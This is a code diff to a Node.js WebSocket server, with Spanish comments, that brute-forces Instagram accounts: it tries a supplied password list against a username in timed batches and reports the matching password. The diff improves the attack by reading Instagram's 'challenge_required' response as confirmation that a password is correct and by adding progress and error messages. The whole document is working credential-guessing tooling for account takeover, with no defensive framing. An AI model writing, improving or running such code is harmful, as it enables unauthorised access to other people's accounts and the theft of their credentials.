@@ -49,14 +49,25 @@ async function processBatch(username, passwords) {
     } catch (error) {
       lastError = error.message;
       
+      // Detectar si la contraseña es correcta pero requiere verificación
       if (error.message.includes('challenge_required')) {
-        return { success: false, message: 'Desafío de seguridad detectado. Se requiere verificación manual.' };
+        return { 
+          success: true, 
+          password: password,
+          message: '¡Contraseña correcta! Instagram requiere verificación adicional (código SMS/email).',
+          requiresChallenge: true
+        };
+      }
+      
+      // Detectar otros errores comunes
+      if (error.message.includes('password')) {
+        lastError = 'Contraseña incorrecta';
       }
     } finally {
       await smartDelay(lastError);
     }
   }
-  return { success: false };
+  return { success: false, message: 'No se encontró la contraseña en la lista proporcionada' };
 }
 
 // Servir archivos estáticos
@@ -67,49 +78,60 @@ wss.on('connection', (ws) => {
   console.log('Nueva conexión WebSocket');
 
   ws.on('message', async (message) => {
-    const data = JSON.parse(message);
-    
-    // Verificar contraseña de acceso
-    if (data.type === 'verifyAccessPassword') {
-      if (data.password === CONFIG.ACCESS_PASSWORD) {
-        ws.send(JSON.stringify({ type: 'accessGranted' }));
-      } else {
-        ws.send(JSON.stringify({ 
-          type: 'accessDenied', 
-          message: 'Contraseña de acceso incorrecta' 
-        }));
-      }
-      return;
-    }
-    
-    // Procesar inicio de sesión
-    if (data.type === 'startLogin') {
-      const { username, passwords } = data;
-      const total = passwords.length;
+    try {
+      const data = JSON.parse(message);
       
-      for (let i = 0; i < total; i += CONFIG.BATCH_SIZE) {
-        const batch = passwords.slice(i, i + CONFIG.BATCH_SIZE);
-        const result = await processBatch(username, batch);
-        
-        ws.send(JSON.stringify({
-          progress: { current: Math.min(i + CONFIG.BATCH_SIZE, total), total },
-          ...result
-        }));
-        
-        if (result.success) {
-          return ws.send(JSON.stringify({ 
-            type: 'finished',
-            success: true,
-            message: `¡Éxito! Contraseña encontrada: ${result.password}`,
-            password: result.password
+      // Verificar contraseña de acceso
+      if (data.type === 'verifyAccessPassword') {
+        if (data.password === CONFIG.ACCESS_PASSWORD) {
+          ws.send(JSON.stringify({ type: 'accessGranted' }));
+        } else {
+          ws.send(JSON.stringify({ 
+            type: 'accessDenied', 
+            message: 'Contraseña de acceso incorrecta' 
           }));
         }
+        return;
       }
       
-      ws.send(JSON.stringify({ 
-        type: 'finished',
-        success: false,
-        message: 'No se encontró la contraseña en la lista proporcionada'
+      // Procesar inicio de sesión
+      if (data.type === 'startLogin') {
+        const { username, passwords } = data;
+        const total = passwords.length;
+        
+        for (let i = 0; i < total; i += CONFIG.BATCH_SIZE) {
+          const batch = passwords.slice(i, i + CONFIG.BATCH_SIZE);
+          const result = await processBatch(username, batch);
+          
+          // Enviar progreso
+          ws.send(JSON.stringify({
+            type: 'progress',
+            progress: { current: Math.min(i + CONFIG.BATCH_SIZE, total), total },
+            ...result
+          }));
+          
+          if (result.success) {
+            return ws.send(JSON.stringify({ 
+              type: 'finished',
+              success: true,
+              message: result.message || `¡Éxito! Contraseña encontrada: ${result.password}`,
+              password: result.password,
+              requiresChallenge: result.requiresChallenge || false
+            }));
+          }
+        }
+        
+        ws.send(JSON.stringify({ 
+          type: 'finished',
+          success: false,
+          message: 'No se encontró la contraseña en la lista proporcionada'
+        }));
+      }
+    } catch (error) {
+      console.error('Error procesando mensaje:', error);
+      ws.send(JSON.stringify({
+        type: 'error',
+        message: 'Error interno del servidor'
       }));
     }
   });
